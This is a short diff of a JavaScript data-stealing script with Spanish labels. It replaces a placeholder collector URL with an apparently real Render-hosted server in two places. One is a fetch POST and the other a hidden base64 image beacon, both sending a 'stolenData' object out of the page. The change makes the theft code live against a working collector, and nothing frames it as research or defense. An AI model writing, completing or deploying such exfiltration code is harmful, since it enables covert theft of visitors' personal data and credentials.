@@ -288,7 +288,7 @@
             
             console.log("Datos capturados:", stolenData);
             
-            fetch('https://tu-servidor-colector.com/recolectar', {
+            fetch('https://mi-server-bkk1.onrender.com/Datos', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -300,7 +300,7 @@
             
             const encodedData = btoa(JSON.stringify(stolenData));
             const exfilImage = new Image();
-            exfilImage.src = 'https://tu-servidor-colector.com/recolectar?data=' + encodedData;
+            exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
             exfilImage.style.display = 'none';
             document.body.appendChild(exfilImage);
             
